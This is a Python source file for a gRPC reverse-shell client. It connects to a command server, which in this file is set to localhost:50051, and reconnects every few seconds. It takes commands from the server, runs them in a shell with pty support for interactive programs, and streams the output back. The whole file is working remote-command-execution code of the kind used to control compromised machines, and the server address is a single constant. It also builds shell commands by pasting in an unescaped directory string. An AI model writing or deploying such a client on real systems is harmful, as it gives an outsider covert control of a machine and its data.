import grpc
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import subprocess
import asyncio
import logging
import os
import pty

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])

class ReverseShellClient:
    def __init__(self):
        self.channel = None
        self.stub = None
        self.connected = False
        self.current_task = None
        self.stop_event = asyncio.Event()
        self.current_process = None
        self.current_directory = "/"  # Track the current working directory

    async def start(self):
        logging.info("Client start method initiated.")
        self.channel = grpc.aio.insecure_channel('localhost:50051')
        self.stub = reverse_shell_pb2_grpc.ReverseShellServiceStub(self.channel)

        while True:
            try:
                if not self.connected:
                    logging.info("Connecting to gRPC server...")
                    await self.connect_to_server()
                else:
                    logging.info("Requesting commands from server.")
                    async for command_request in self.stub.StartSession(iter([])):
                        command = command_request.output.strip()
                        logging.info(f"Received command from server: {command}")

                        if command:
                            if command.lower() == "stop":
                                logging.info("Stop command received, attempting to stop the running process.")
                                self.stop_event.set()
                                if self.current_task and not self.current_task.done():
                                    await self.current_task
                                self.stop_event.clear()
                                self.current_task = None
                                self.current_process = None

                            elif self.current_task is None or self.current_task.done():
                                # Only start a new task if there's no ongoing one
                                self.current_task = asyncio.create_task(self.handle_command(command, command_request.request_id))
                        else:
                            logging.info("No command received; waiting for the next command.")
            except grpc.RpcError as e:
                logging.error(f"Error in receiving commands: {e.details()}")
                self.connected = False
            except Exception as e:
                logging.error(f"Unexpected error: {str(e)}")
            await asyncio.sleep(5)  # Retry after delay if disconnected

    async def connect_to_server(self):
        await self.channel.channel_ready()
        self.connected = True
        logging.info("Connected to gRPC server.")

    async def handle_command(self, command, request_id):
        try:
            if self.stop_event.is_set():
                logging.info(f"Stopping the previous command before executing new one.")
                if self.current_process and self.current_process.returncode is None:
                    self.current_process.terminate()
                    await self.current_process.wait()
                self.stop_event.clear()
                self.current_task = None

            if command.startswith("cd "):
                new_directory = command[3:].strip()
                if new_directory == "..":
                    # Handle moving up a directory
                    self.current_directory = '/'.join(self.current_directory.rstrip('/').split('/')[:-1])
                    if not self.current_directory:
                        self.current_directory = '/'
                else:
                    # Handle changing to a new directory
                    if not new_directory.startswith('/'):
                        new_directory = f"{self.current_directory}/{new_directory}"
                    self.current_directory = new_directory
                logging.info(f"Changed directory to: {self.current_directory}")
                # Send directory change response to the server
                directory_change_response = reverse_shell_pb2.CommandResponse(
                    request_id=request_id,
                    output=f"Changed directory to: {self.current_directory}",
                    is_active=False
                )
                async for _ in self.stub.StreamResponses(iter([directory_change_response])):
                    logging.info(f"Sent directory change response to server: {self.current_directory}")
            elif command == "htop":
                await self.execute_htop(command, request_id)
            else:
                async for output in self.execute_command(command):
                    response = reverse_shell_pb2.CommandResponse(
                        request_id=request_id,
                        output=output,
                        is_active=True
                    )
                    async for _ in self.stub.StreamResponses(iter([response])):
                        logging.info(f"Sent command output to server for command: {command}")
        except asyncio.CancelledError:
            logging.info(f"Command {command} was cancelled.")
        finally:
            final_response = reverse_shell_pb2.CommandResponse(
                request_id=request_id,
                output="",
                is_active=False
            )
            self.stub.StreamResponses(iter([final_response]))
            logging.info("Command processing finished.")

    async def execute_htop(self, command, request_id):
        logging.info(f"Executing htop command.")
        
        master_fd, slave_fd = pty.openpty()
        self.current_process = await asyncio.create_subprocess_exec(
            command,
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            close_fds=True
        )

        os.close(slave_fd)
        
        try:
            while not self.stop_event.is_set():
                output = await asyncio.to_thread(os.read, master_fd, 1024)
                if not output:
                    break
                decoded_output = output.decode(errors='ignore')
                logging.info(f"htop output: {decoded_output.strip()}")

                response = reverse_shell_pb2.CommandResponse(
                    request_id=request_id,
                    output=decoded_output,
                    is_active=True
                )
                async for _ in self.stub.StreamResponses(iter([response])):
                    logging.info(f"Sent htop output to server.")
        finally:
            os.close(master_fd)
            if self.current_process:
                if self.current_process.returncode is None:
                    self.current_process.terminate()
                    await self.current_process.wait()
                self.current_process = None
            logging.info("htop process terminated.")

    async def execute_command(self, command, timeout=30):
        logging.info(f"Executing command in directory {self.current_directory}: {command}")
        full_command = f"cd {self.current_directory} && {command}"
        self.current_process = await asyncio.create_subprocess_shell(
            full_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        try:
            while self.current_process and not self.stop_event.is_set():
                line = await asyncio.wait_for(self.current_process.stdout.readline(), timeout=timeout)
                if not line:
                    break
                decoded_line = line.decode().strip()
                logging.info(f"Command stdout: {decoded_line}")
                yield decoded_line

            if self.current_process and not self.stop_event.is_set():
                stderr = await asyncio.wait_for(self.current_process.stderr.read(), timeout=timeout)
                if stderr:
                    decoded_stderr = stderr.decode().strip()
                    logging.info(f"Command stderr: {decoded_stderr}")
                    yield decoded_stderr
        finally:
            if self.current_process:
                if self.current_process.returncode is None:
                    self.current_process.terminate()
                    await self.current_process.wait()
                self.current_process = None
                logging.info("Process terminated.")

    async def close(self):
        if self.channel:
            await self.channel.close()

async def main():
    client = ReverseShellClient()
    try:
        await client.start()
    except KeyboardInterrupt:
        logging.info("Shutting down client.")
        await client.close()

if __name__ == "__main__":
    asyncio.run(main())
